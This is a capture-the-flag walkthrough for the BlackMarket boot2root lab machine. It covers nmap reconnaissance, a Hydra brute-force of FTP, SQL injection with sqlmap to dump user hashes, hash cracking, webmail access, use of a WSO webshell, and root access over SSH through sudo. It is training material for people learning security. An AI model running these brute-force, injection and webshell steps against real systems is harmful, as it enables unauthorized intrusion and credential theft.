## Reconnaissance
 
An initial Nmap scan reveals the attack surface:
 
```bash
nmap -sV ctf06.root-me.org
```
 
```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.2
22/tcp  open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7
53/tcp  open  domain?
80/tcp  open  http     Apache httpd 2.4.7
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
```
 
Notable services: FTP, HTTP, SSH, and a full Dovecot mail stack (POP3/IMAP with SSL). The combination of FTP and a mail server suggests that credentials discovered elsewhere will be reused across services.
 
---
 
## Flag 1 Web Enumeration
 
Inspecting the HTML source of the BlackMarket login page reveals a base64-encoded comment:
 
```html
<!-- flag1{Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=} -->
```
 
Decoding it:
 
```bash
echo "Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=" | base64 -d
# CIA - Operation Treadstone
```
 
> **flag1{Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=}**  
> Decoded: `CIA - Operation Treadstone`
 
The Treadstone reference immediately suggests building a wordlist from the known members of that operation, which will be used to attack the FTP service.
 
---
 
## Flag 2 FTP Brute-Force
 
Using the staff and known assets listed on the website, a targeted username wordlist is built from Operation Treadstone characters (all lowercase):
 
```
cia, treadstone, richard, webb, ward, abbott, alexander, conklin,
albert, hirsch, neil, daniels, nicky, parsons, daniel, zorn
```
 
Hydra is used to brute-force the FTP service with this list as both usernames and passwords:
 
```bash
hydra -L users.txt -P users.txt ftp://ctf06.root-me.org -t 4 -V -f
```
 
A valid credential pair is found: **`nicky:CIA`**
 
Logging in and retrieving the only file present:
 
```bash
ftp ctf06.root-me.org
# login: nicky / CIA
ftp> get IMP.txt
```
 
```
flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}
 
If anyone reading this message it means you are on the right track however
I do not have any idea about the CIA blackmarket Vehical workshop.
You must find out and hack it!
```
 
> **flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}**  
> Decoded: `Congrats Proceed Further`
 
The hint points to a hidden vehicle workshop section of the web application.
 
---
 
## Flag 3 SQL Injection
 
Directory enumeration reveals the hidden path `/vworkshop/`, and the following endpoint:
 
```
http://ctf06.root-me.org/vworkshop/sparepartsstoremore.php?sparepartid=1
```
 
The `sparepartid` parameter is vulnerable to SQL injection. Sqlmap is used to enumerate and dump the database:
 
```bash
# Enumerate databases
sqlmap -u "http://ctf06.root-me.org/vworkshop/sparepartsstoremore.php?sparepartid=1" \
  --batch --dbs
 
# Dump the flag table
sqlmap -u "http://ctf06.root-me.org/vworkshop/sparepartsstoremore.php?sparepartid=1" \
  -D BlackMarket -T flag --dump --batch
```
 
The flag table returns:
 
```
+--------+--------+--------------------------------+
| FlagId | name   | Information                    |
+--------+--------+--------------------------------+
| 3      | Flag   | Find Jason Bourne Email access |
+--------+--------+--------------------------------+
```
 
Dumping the `user` table also yields credentials for the next step:
 
```bash
sqlmap -u "..." -D BlackMarket -T user --dump --batch
```
 
```
+--------+----------------------------------+----------+
| access | password (MD5)                   | username |
+--------+----------------------------------+----------+
| 1      | cf18233438b9e88937ea0176f1311885 | admin    |
| 2      | 0d8d5cd06832b29560745fe4e1b941cf | user     |
| 3      | 99b0e8da24e29e4ccb5d7d76e677c2ac | supplier |
| 2      | 28267a2e06e312aee91324e2fe8ef1fd | jbourne  |
| 3      | cbb8d2a0335c793532f9ad516987a41c | bladen   |
+--------+----------------------------------+----------+
```
 
> **flag3** is implicit in discovering the `BlackMarket` database and the hint to find Jason Bourne's email access.
 
---
 
## Flag 4 BlackMarket Login
 
The `admin` MD5 hash is cracked using an online database (CrackStation):
 
```
cf18233438b9e88937ea0176f1311885 → BigBossCIA
```
 
Logging into the BlackMarket portal with `admin:BigBossCIA` returns:
 
```
Login Success, Welcome BigBOSS! here is your flag4{bm90aGluZyBpcyBoZXJl}
Jason Bourne Email access ?????
```
 
> **flag4{bm90aGluZyBpcyBoZXJl}**  
> Decoded: `nothing is here`
 
The prompt about Jason Bourne's email access points directly to the Dovecot mail service.
 
---
 
## Flag 5 Squirrelmail & Atbash Cipher
 
The BlackMarket login hint revealed the literal string `?????` as the password for `jbourne`. Logging into Squirrelmail at `/squirrelmail/`:
 
```
Username: jbourne
Password: ?????
```
 
Inside the inbox, an **IMPORTANT MESSAGE** email contains flag 5 and an encoded message:
 
```
Flag5{RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=}
 
<Message Begins>
Sr Wrnrgir
Ru blf ziv ivzwrmt gsrh R nrtsg yv mlg zorev. R szev kozxv z yzxpwlli
rm Yozxpnzipvg dliphslk fmwvi /ptyyzxpwlli ulowvi blf nfhg szev gl
KzhhKzhh.qkt rm liwvi gl szxp rm rg.
</end>
```
 
> **flag5{RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=}**  
> Decoded: `Everything is encrypted`
 
The message body is encrypted with the **Atbash cipher** (A↔Z, B↔Y, etc.). Decoding it yields:
 
```
Hi Dimitri
If you are reading this I might not be alive. I have placed a backdoor
in Blackmarket workshop under /kgbbackdoor folder you must have to
PassPass.jpg in order to hack in it.
```
 
This reveals two critical pieces of information: a hidden directory (`/vworkshop/kgbbackdoor/`) and a password image (`PassPass.jpg`).
 
---
 
## Flag 6 KGB Backdoor
 
### Extracting the password from the image
 
Navigating to the image and running `strings` against it:
 
```bash
wget http://ctf06.root-me.org/vworkshop/kgbbackdoor/PassPass.jpg
strings PassPass.jpg | grep Pass
# Pass = 5215565757312090656
```
 
Converting the numeric value to ASCII:
 
```bash
echo "5215565757312090656" | python3 -c \
  "import sys; print(int(sys.stdin.read().strip()).to_bytes(9, 'big'))"
# b'\x00HailKGB '
```
 
The password is **`HailKGB`**.
 
### Accessing the backdoor
 
Navigating to `/vworkshop/kgbbackdoor/backdoor.php` presents a password-protected PHP webshell disguised as a 404 error page. Submitting `HailKGB` grants access to a **WSO 2.6** webshell.
 
From the webshell's file browser, a flag file is found and read:
 
```
flag6{Um9vdCB0aW1l}
```
 
> **flag6{Um9vdCB0aW1l}**  
> Decoded: `Root time`
 
Continuing to explore the file system via the webshell's Execute field, a hidden file is found in the home directory:
 
```bash
cat /home/dimitri/.Secret
```
 
```
...About my personal life...I eat everything but DimitryHateApple
```
 
The string `DimitryHateApple` stands out. Noting a likely typo (Dimitry vs Dimitri), the correct password is tested as **`DimitriHateApple`**.
 
---
 
## Root Privilege Escalation
 
SSH access is obtained using the credentials found in the `.Secret` file:
 
```bash
ssh dimitri@ctf06.root-me.org
# password: DimitriHateApple
```
 
Checking sudo privileges:
 
```bash
sudo -l
# User dimitri may run the following commands on Dimitri:
#     (ALL : ALL) ALL
```
 
The user has **full unrestricted sudo access**. Root is obtained immediately:
 
```bash
sudo -i
# root@Dimitri:~#
cat THEEND.txt
```
 
```
FINALLY YOU MADE IT!
 
THANKS FOR PLAYING BOOT2ROOT CTF AND PLEASE DO MAIL ME ANY SUGGESTIONS
@ acebomber@protomail.com
 
THANKS SECTALKS BRISBANE FOR HOSTING MY CTF
```
 
> **Root flag obtained.**
